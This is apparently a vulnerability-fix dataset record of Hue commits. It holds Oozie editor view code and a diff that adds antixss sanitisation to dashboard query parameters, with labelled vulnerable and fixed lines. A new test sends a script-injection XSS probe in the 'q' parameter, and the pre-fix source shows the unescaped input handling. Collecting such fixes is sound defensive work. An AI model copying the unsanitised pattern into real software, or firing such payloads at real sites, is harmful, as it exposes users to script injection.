Workflow(document=doc)\n  else:\n    doc = None\n    workflow = Workflow()\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n  \n  workflow_data = workflow.get_data()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  return render('editor/workflow_editor.mako', request, {\n      'layout_json': json.dumps(workflow_data['layout']),\n      'workflow_json': json.dumps(workflow_data['workflow']),\n      'credentials_json': json.dumps(credentials.credentials.keys()),\n      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'subworkflows_json': json.dumps(_get_workflows(request.user)),\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_workflow(request):\n  return edit_workflow(request)\n\n\ndef delete_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(id=job['id'])\n    doc = doc2.doc.get()\n    doc.can_write_or_exception(request.user)\n    \n    doc.delete()\n    doc2.delete()\n\n  response = {}\n  request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.'))\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef copy_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(type='oozie-workflow2', id=job['id'])\n    \n    name = doc2.name + '-copy'\n    copy_doc = doc2.doc.get().copy(name=name, owner=request.user)\n  \n    doc2.pk = None\n    doc2.id = None\n    doc2.uuid = str(uuid.uuid4())\n    doc2.name = name\n    doc2.owner = request.user    \n    doc2.save()\n  \n    doc2.doc.all().delete()\n    doc2.doc.add(copy_doc)\n    \n    workflow = Workflow(document=doc2)\n    workflow.update_name(name)\n    doc2.update_data({'workflow': workflow.get_data()['workflow']})\n    doc2.save()\n\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n\n  response = {}  \n  request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.'))\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_modify_permission()\ndef save_workflow(request):\n  response = {'status': -1}\n\n  workflow = json.loads(request.POST.get('workflow', '{}'))\n  layout = json.loads(request.POST.get('layout', '{}'))\n\n  if workflow.get('id'):\n    workflow_doc = Document2.objects.get(id=workflow['id'])\n  else:      \n    workflow_doc = Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user)\n    Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2')\n\n  subworkflows = [node['properties']['workflow'] for node in workflow['nodes'] if node['type'] == 'subworkflow-widget']\n  if subworkflows:\n    dependencies = Document2.objects.filter(uuid__in=subworkflows)\n    workflow_doc.dependencies = dependencies\n\n  workflow_doc.update_data({'workflow': workflow})\n  workflow_doc.update_data({'layout': layout})\n  workflow_doc.name = workflow['name']\n  workflow_doc.save()\n  \n  workflow_instance = Workflow(document=workflow_doc)\n  \n  response['status'] = 0\n  response['id'] = workflow_doc.id\n  response['doc1_id'] = workflow_doc.doc.get().id\n  response['message'] = _('Page saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef new_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n\n  properties = NODES[node['widgetType']].get_mandatory_fields()\n  workflows = []\n\n  if node['widgetType'] == 'subworkflow-widget':\n    workflows = _get_workflows(request.user)\n\n  response['status'] = 0\n  response['properties'] = properties \n  response['workflows'] = workflows\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef _get_workflows(user):\n  return [{\n        'name': workflow.name,\n        'owner': workflow.owner.username,\n        'value': workflow.uuid,\n        'id': workflow.id\n      } for workflow in [d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')]\n    ]  \n\n\ndef add_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n  properties = json.loads(request.POST.get('properties', '{}'))\n  copied_properties = json.loads(request.POST.get('copiedProperties', '{}'))\n\n  _properties = dict(NODES[node['widgetType']].get_fields())\n  _properties.update(dict([(_property['name'], _property['value']) for _property in properties]))\n\n  if copied_properties:\n    _properties.update(copied_properties)\n\n  response['status'] = 0\n  response['properties'] = _properties\n  response['name'] = '%s-%s' % (node['widgetType'].split('-')[0], node['id'][:4])\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef action_parameters(request):\n  response = {'status': -1}\n  parameters = set()\n\n  try:\n    node_data = json.loads(request.POST.get('node', '{}'))\n    \n    parameters = parameters.union(set(Node(node_data).find_parameters()))\n    \n    script_path = node_data.get('properties', {}).get('script_path', {})\n    if script_path:\n      script_path = script_path.replace('hdfs://', '')\n\n      if request.fs.do_as_user(request.user, request.fs.exists, script_path):\n        data = request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2)  \n\n        if node_data['type'] in ('hive', 'hive2'):\n          parameters = parameters.union(set(find_dollar_braced_variables(data)))\n        elif node_data['type'] == 'pig':\n          parameters = parameters.union(set(find_dollar_variables(data)))\n                \n    response['status'] = 0\n    response['parameters'] = list(parameters)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef workflow_parameters(request):\n  response = {'status': -1}\n\n  try:\n    workflow = Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) \n\n    response['status'] = 0\n    response['parameters'] = workflow.find_all_parameters(with_lib_path=False)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_workflow(request):\n  response = {'status': -1}\n\n  try:\n    workflow_json = json.loads(request.POST.get('workflow', '{}'))\n  \n    workflow = Workflow(workflow=workflow_json)\n  \n    response['status'] = 0\n    response['xml'] = workflow.to_xml()\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_workflow(request, doc_id):\n  workflow = Workflow(document=Document2.objects.get(id=doc_id))\n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)    \n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n\n      job_id = _submit_workflow(request.user, request.fs, request.jt, workflow, mapping)\n\n      request.info(_('Workflow submitted'))\n      return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = workflow.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n    popup = render('editor/submit_job_popup.mako', request, {\n                     'params_form': params_form,\n                     'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id})\n                   }, force_template=True).content\n    return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_workflow(user, fs, jt, workflow, mapping):\n  try:\n    submission = Submission(user, workflow, fs, jt, mapping)\n    job_id = submission.run()\n    return job_id\n  except RestException, ex:\n    detail = ex._headers.get('oozie-error-message', ex)\n    if 'Max retries exceeded with url' in str(detail):\n      detail = '%s: %s' % (_('The Oozie server is not running'), detail)\n    LOG.error(smart_str(detail))\n    raise PopupException(_(\"Error submitting workflow %s\") % (workflow,), detail=detail)\n\n  return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n\n\n\ndef list_editor_coordinators(request):\n  coordinators = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/list_editor_coordinators.mako', request, {\n      'coordinators': coordinators\n  })\n\n\n@check_document_access_permission()\ndef edit_coordinator(request):\n  coordinator_id = request.GET.get('coordinator')\n  doc = None\n  \n  if coordinator_id:\n    doc = Document2.objects.get(id=coordinator_id)\n    coordinator = Coordinator(document=doc)\n  else:\n    coordinator = Coordinator()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  workflows = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                                    for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  if coordinator_id and not filter(lambda a: a['uuid'] == coordinator.data['properties']['workflow'], workflows):\n    raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n\n  return render('editor/coordinator_editor.mako', request, {\n      'coordinator_json': coordinator.json,\n      'credentials_json': json.dumps(credentials.credentials.keys()),\n      'workflows_json': json.dumps(workflows),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_coordinator(request):\n  return edit_coordinator(request)\n\n\n@check_document_modify_permission()\ndef save_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_data = json.loads(request.POST.get('coordinator', '{}'))\n\n  if coordinator_data.get('id'):\n    coordinator_doc = Document2.objects.get(id=coordinator_data['id'])\n  else:      \n    coordinator_doc = Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user)\n    Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2')\n\n  if coordinator_data['properties']['workflow']:\n    dependencies = Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow'])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)\n    coordinator_doc.dependencies = dependencies\n\n  coordinator_doc.update_data(coordinator_data)\n  coordinator_doc.name = coordinator_data['name']\n  coordinator_doc.save()\n  \n  response['status'] = 0\n  response['id'] = coordinator_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_dict = json.loads(request.POST.get('coordinator', '{}'))\n\n  coordinator = Coordinator(data=coordinator_dict)\n\n  response['status'] = 0\n  response['xml'] = coordinator.to_xml()\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\") \n\n\n@check_document_access_permission()\ndef submit_coordinator(request, doc_id):\n  coordinator = Coordinator(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_coordinator(request, coordinator, mapping)\n\n      request.info(_('Coordinator submitted.'))\n      return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = coordinator.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_coordinator',  kwargs={'doc_id': coordinator.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_coordinator(request, coordinator, mapping):\n  try:\n    wf_doc = Document2.objects.get(uuid=coordinator.data['properties']['workflow'])\n    wf_dir = Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy()\n\n    properties = {'wf_application_path': request.fs.get_hdfs_path(wf_dir)}\n    properties.update(mapping)\n\n    submission = Submission(request.user, coordinator, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting coordinator %s\") % (coordinator,),\n                         detail=ex._headers.get('oozie-error-message', ex))\n    \n    \n    \n\ndef list_editor_bundles(request):\n  bundles = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')]\n\n  return render('editor/list_editor_bundles.mako', request, {\n      'bundles': bundles\n  })\n\n\n@check_document_access_permission()\ndef edit_bundle(request):\n  bundle_id = request.GET.get('bundle')\n  doc = None\n  \n  if bundle_id:\n    doc = Document2.objects.get(id=bundle_id)\n    bundle = Bundle(document=doc)\n  else:\n    bundle = Bundle()\n\n  coordinators = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                      for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/bundle_editor.mako', request, {\n      'bundle_json': bundle.json,\n      'coordinators_json': json.dumps(coordinators),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n  })\n\n\ndef new_bundle(request):\n  return edit_bundle(request)\n\n\n@check_document_modify_permission()\ndef save_bundle(request):\n  response = {'status': -1}\n\n  bundle_data = json.loads(request.POST.get('bundle', '{}'))\n\n  if bundle_data.get('id'):\n    bundle_doc = Document2.objects.get(id=bundle_data['id'])\n  else:      \n    bundle_doc = Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user)\n    Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2')\n\n  if bundle_data['coordinators']:\n    dependencies = Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)    \n    bundle_doc.dependencies = dependencies\n\n  bundle_doc.update_data(bundle_data)\n  bundle_doc.name = bundle_data['name']\n  bundle_doc.save()\n  \n  response['status'] = 0\n  response['id'] = bundle_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_bundle(request, doc_id):\n  bundle = Bundle(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_bundle(request, bundle, mapping)\n\n      request.info(_('Bundle submitted.'))\n      return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = bundle.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_bundle',  kwargs={'doc_id': bundle.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_bundle(request, bundle, properties):\n  try:\n    deployment_mapping = {}\n    coords = dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])])\n    \n    for i, bundled in enumerate(bundle.data['coordinators']):\n      coord = coords[bundled['coordinator']]\n      workflow = Workflow(document=coord.dependencies.all()[0])\n      wf_dir = Submission(request.user, workflow, request.fs, request.jt, properties).deploy()      \n      deployment_mapping['wf_%s_dir' % i] = request.fs.get_hdfs_path(wf_dir)\n      \n      coordinator = Coordinator(document=coord)\n      coord_dir = Submission(request.user, coordinator, request.fs, request.jt, properties).deploy()\n      deployment_mapping['coord_%s_dir' % i] = coord_dir\n      deployment_mapping['coord_%s' % i] = coord\n\n    properties.update(deployment_mapping)\n    \n    submission = Submission(request.user, bundle, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting bundle %s\") % (bundle,), detail=ex._headers.get('oozie-error-message', ex))\n\n"}}, "msg": "[oozie] Protect against XSS in the editor"}, "37b529b1f9aeb5d746599a9ed4e2288cf3ad3e1d": {"url": "https://api.github.com/repos/gethue/hue/commits/37b529b1f9aeb5d746599a9ed4e2288cf3ad3e1d", "html_url": "https://github.com/gethue/hue/commit/37b529b1f9aeb5d746599a9ed4e2288cf3ad3e1d", "sha": "37b529b1f9aeb5d746599a9ed4e2288cf3ad3e1d", "keyword": "XSS protect", "diff": "diff --git a/desktop/libs/dashboard/src/dashboard/tests.py b/desktop/libs/dashboard/src/dashboard/tests.py\nindex e5b063197b..7dbe808570 100644\n--- a/desktop/libs/dashboard/src/dashboard/tests.py\n+++ b/desktop/libs/dashboard/src/dashboard/tests.py\n@@ -507,6 +507,15 @@ def test_download(self):\n     assert_equal('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', xls_response['Content-Type'])\n     assert_equal('attachment; filename=query_result.xlsx', xls_response['Content-Disposition'])\n \n+  def test_index_xss(self):\n+    doc = Document2.objects.create(name='test_dashboard', type='search-dashboard', owner=self.user,\n+                                   data=json.dumps(self.collection.data), parent_directory=self.home_dir)\n+    try:\n+      response = self.c.get(reverse('dashboard:index') + ('?collection=%s' % doc.id) + '&q=</script><script>alert(%27XSS%27)</script>')\n+      assert_equal('{\"fqs\": [], \"qs\": [{\"q\": \"alert(\\'XSS\\')\"}], \"start\": 0}', response.context['query'])\n+    finally:\n+      doc.delete()\n+\n   def test_augment_response(self):\n     collection = self._get_collection_param(self.collection)\n     query = QUERY\ndiff --git a/desktop/libs/dashboard/src/dashboard/views.py b/desktop/libs/dashboard/src/dashboard/views.py\nindex 85851b7088..c771345591 100644\n--- a/desktop/libs/dashboard/src/dashboard/views.py\n+++ b/desktop/libs/dashboard/src/dashboard/views.py\n@@ -26,6 +26,7 @@\n from desktop.lib.django_util import JsonResponse, render\n from desktop.lib.exceptions_renderable import PopupException\n from desktop.models import Document2, Document\n+from desktop.views import antixss\n \n from search.conf import LATEST\n \n@@ -72,9 +73,9 @@ def index(request, is_mobile=False):\n \n   if request.method == 'GET':\n     if 'q' in request.GET:\n-      query['qs'][0]['q'] = request.GET.get('q')\n+      query['qs'][0]['q'] = antixss(request.GET.get('q', ''))\n     if 'qd' in request.GET:\n-      query['qd'] = request.GET.get('qd')\n+      query['qd'] = antixss(request.GET.get('qd', ''))\n \n   template = 'search.mako'\n   if is_mobile:\n@@ -89,7 +90,7 @@ def index(request, is_mobile=False):\n         'is_latest': LATEST.get(),\n         'engines': get_engines(request.user)\n     }),\n-    'is_owner': collection_doc.doc.get().can_write(request.user),\n+    'is_owner': collection_doc.can_write(request.user) if USE_NEW_EDITOR.get() else collection_doc.doc.get().can_write(request.user),\n     'can_edit_index': can_edit_index(request.user),\n     'is_embeddable': request.GET.get('is_embeddable', False),\n     'mobile': is_mobile,\n", "message": "", "files": {"/desktop/libs/dashboard/src/dashboard/views.py": {"changes": [{"diff": "\n \n   if request.method == 'GET':\n     if 'q' in request.GET:\n-      query['qs'][0]['q'] = request.GET.get('q')\n+      query['qs'][0]['q'] = antixss(request.GET.get('q', ''))\n     if 'qd' in request.GET:\n-      query['qd'] = request.GET.get('qd')\n+      query['qd'] = antixss(request.GET.get('qd', ''))\n \n   template = 'search.mako'\n   if is_mobile:\n", "add": 2, "remove": 2, "filename": "/desktop/libs/dashboard/src/dashboard/views.py", "badparts": ["      query['qs'][0]['q'] = request.GET.get('q')", "      query['qd'] = request.GET.get('qd')"], "goodparts": ["      query['qs'][0]['q'] = antixss(request.GET.get('q', ''))", "      query['qd'] = antixss(request.GET.get('qd', ''))"]}, {"diff": "\n         'is_latest': LATEST.get(),\n         'engines': get_engines(request.user)\n     }),\n-    'is_owner': collection_doc.doc.get().can_write(request.user),\n+    'is_owner': collection_doc.can_write(request.user) if USE_NEW_EDITOR.get() else collection_doc.doc.get().can_write(request.user),\n     'can_edit_index': can_edit_index(request.user),\n     'is_embeddable': request.GET.get('is_embeddable', False),\n     'mobile': is_mobile,\n", "add": 1, "remove": 1, "filename": "/desktop/libs/dashboard/src/dashboard/views.py", "badparts": ["    'is_owner': collection_doc.doc.get().can_write(request.user),"], "goodparts": ["    'is_owner': collection_doc.can_write(request.user) if USE_NEW_EDITOR.get() else collection_doc.doc.get().can_write(request.user),"]}], "source": "\n import json import logging from django.utils.html import escape from django.utils.translation import ugettext as _ from django.core.urlresolvers import reverse from desktop.conf import USE_NEW_EDITOR from desktop.lib.django_util import JsonResponse, render from desktop.lib.exceptions_renderable import PopupException from desktop.models import Document2, Document from search.conf import LATEST from dashboard.dashboard_api import get_engine from dashboard.decorators import allow_owner_only from dashboard.models import Collection2 from dashboard.conf import get_engines from dashboard.controller import DashboardController, can_edit_index LOG=logging.getLogger(__name__) DEFAULT_LAYOUT=[ {\"size\":2,\"rows\":[{\"widgets\":[]}],\"drops\":[\"temp\"],\"klass\":\"card card-home card-column span2\"}, {\"size\":10,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":\"Filter Bar\",\"widgetType\":\"filter-widget\", \"id\":\"99923aef-b233-9420-96c6-15d48293532b\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}, {\"widgets\":[ {\"size\":12,\"name\":\"Grid Results\",\"widgetType\":\"resultset-widget\", \"id\":\"14023aef-b233-9420-96c6-15d48293532b\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"}, ] def index(request, is_mobile=False): hue_collections=DashboardController(request.user).get_search_collections() collection_id=request.GET.get('collection') if not hue_collections or not collection_id: return admin_collections(request, True, is_mobile) try: collection_doc=Document2.objects.get(id=collection_id) if USE_NEW_EDITOR.get(): collection_doc.can_read_or_exception(request.user) else: collection_doc.doc.get().can_read_or_exception(request.user) collection=Collection2(request.user, document=collection_doc) except Exception, e: raise PopupException(e, title=_(\"Dashboard does not exist or you don't have the permission to access it.\")) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} if request.method=='GET': if 'q' in request.GET: query['qs'][0]['q']=request.GET.get('q') if 'qd' in request.GET: query['qd']=request.GET.get('qd') template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': json.dumps(query), 'initial': json.dumps({ 'collections':[], 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': collection_doc.doc.get().can_write(request.user), 'can_edit_index': can_edit_index(request.user), 'is_embeddable': request.GET.get('is_embeddable', False), 'mobile': is_mobile, }) def index_m(request): return index(request, True) def new_search(request): engine=request.GET.get('engine', 'solr') collections=get_engine(request.user, engine).datasets() if not collections: return no_collections(request) collection=Collection2(user=request.user, name=collections[0], engine=engine) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} if request.GET.get('format', 'plain')=='json': return JsonResponse({ 'collection': collection.get_props(request.user), 'query': query, 'initial':{ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) } }) else: return render('search.mako', request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': True, 'is_embeddable': request.GET.get('is_embeddable', False), 'can_edit_index': can_edit_index(request.user) }) def browse(request, name, is_mobile=False): engine=request.GET.get('engine', 'solr') collections=get_engine(request.user, engine).datasets() if not collections and engine=='solr': return no_collections(request) collection=Collection2(user=request.user, name=name, engine=engine) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'autoLoad': True, 'collections': collections, 'layout':[ {\"size\":12,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":\"Grid Results\",\"id\":\"52f07188-f30f-1296-2450-f77e02e1a5c0\",\"widgetType\":\"resultset-widget\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"} ], 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': True, 'is_embeddable': request.GET.get('is_embeddable', False), 'can_edit_index': can_edit_index(request.user), 'mobile': is_mobile }) def browse_m(request, name): return browse(request, name, True) @allow_owner_only def save(request): response={'status': -1} collection=json.loads(request.POST.get('collection', '{}')) layout=json.loads(request.POST.get('layout', '{}')) collection['template']['extracode']=escape(collection['template']['extracode']) if collection: if collection['id']: dashboard_doc=Document2.objects.get(id=collection['id']) else: dashboard_doc=Document2.objects.create(name=collection['name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label']) Document.objects.link(dashboard_doc, owner=request.user, name=collection['name'], description=collection['label'], extra='search-dashboard') dashboard_doc.update_data({ 'collection': collection, 'layout': layout }) dashboard_doc1=dashboard_doc.doc.get() dashboard_doc.name=dashboard_doc1.name=collection['label'] dashboard_doc.description=dashboard_doc1.description=collection['description'] dashboard_doc.save() dashboard_doc1.save() response['status']=0 response['id']=dashboard_doc.id response['message']=_('Page saved !') else: response['message']=_('There is no collection to search.') return JsonResponse(response) def no_collections(request): return render('no_collections.mako', request,{'is_embeddable': request.GET.get('is_embeddable', False)}) def admin_collections(request, is_redirect=False, is_mobile=False): existing_hue_collections=DashboardController(request.user).get_search_collections() if request.GET.get('format')=='json': collections=[] for collection in existing_hue_collections: massaged_collection=collection.to_dict() if request.GET.get('is_mobile'): massaged_collection['absoluteUrl']=reverse('search:index_m') +'?collection=%s' % collection.id massaged_collection['isOwner']=collection.doc.get().can_write(request.user) collections.append(massaged_collection) return JsonResponse(collections, safe=False) template='admin_collections.mako' if is_mobile: template='admin_collections_m.mako' return render(template, request,{ 'is_embeddable': request.GET.get('is_embeddable', False), 'existing_hue_collections': existing_hue_collections, 'is_redirect': is_redirect }) def admin_collection_delete(request): if request.method !='POST': raise PopupException(_('POST request required.')) collections=json.loads(request.POST.get('collections')) searcher=DashboardController(request.user) response={ 'result': searcher.delete_collections([collection['id'] for collection in collections]) } return JsonResponse(response) def admin_collection_copy(request): if request.method !='POST': raise PopupException(_('POST request required.')) collections=json.loads(request.POST.get('collections')) searcher=DashboardController(request.user) response={ 'result': searcher.copy_collections([collection['id'] for collection in collections]) } return JsonResponse(response) ", "sourceWithComments": "#!/usr/bin/env python\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport logging\n\nfrom django.utils.html import escape\nfrom django.utils.translation import ugettext as _\n\nfrom django.core.urlresolvers import reverse\nfrom desktop.conf import USE_NEW_EDITOR\nfrom desktop.lib.django_util import JsonResponse, render\nfrom desktop.lib.exceptions_renderable import PopupException\nfrom desktop.models import Document2, Document\n\nfrom search.conf import LATEST\n\nfrom dashboard.dashboard_api import get_engine\nfrom dashboard.decorators import allow_owner_only\nfrom dashboard.models import Collection2\nfrom dashboard.conf import get_engines\nfrom dashboard.controller import DashboardController, can_edit_index\n\n\nLOG = logging.getLogger(__name__)\n\n\nDEFAULT_LAYOUT = [\n     {\"size\":2,\"rows\":[{\"widgets\":[]}],\"drops\":[\"temp\"],\"klass\":\"card card-home card-column span2\"},\n     {\"size\":10,\"rows\":[{\"widgets\":[\n         {\"size\":12,\"name\":\"Filter Bar\",\"widgetType\":\"filter-widget\", \"id\":\"99923aef-b233-9420-96c6-15d48293532b\",\n          \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]},\n                        {\"widgets\":[\n         {\"size\":12,\"name\":\"Grid Results\",\"widgetType\":\"resultset-widget\", \"id\":\"14023aef-b233-9420-96c6-15d48293532b\",\n          \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}],\n        \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"},\n]\n\n\ndef index(request, is_mobile=False):\n  hue_collections = DashboardController(request.user).get_search_collections()\n  collection_id = request.GET.get('collection')\n\n  if not hue_collections or not collection_id:\n    return admin_collections(request, True, is_mobile)\n\n  try:\n    collection_doc = Document2.objects.get(id=collection_id)\n    if USE_NEW_EDITOR.get():\n      collection_doc.can_read_or_exception(request.user)\n    else:\n      collection_doc.doc.get().can_read_or_exception(request.user)\n    collection = Collection2(request.user, document=collection_doc)\n  except Exception, e:\n    raise PopupException(e, title=_(\"Dashboard does not exist or you don't have the permission to access it.\"))\n\n  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}\n\n  if request.method == 'GET':\n    if 'q' in request.GET:\n      query['qs'][0]['q'] = request.GET.get('q')\n    if 'qd' in request.GET:\n      query['qd'] = request.GET.get('qd')\n\n  template = 'search.mako'\n  if is_mobile:\n    template = 'search_m.mako'\n\n  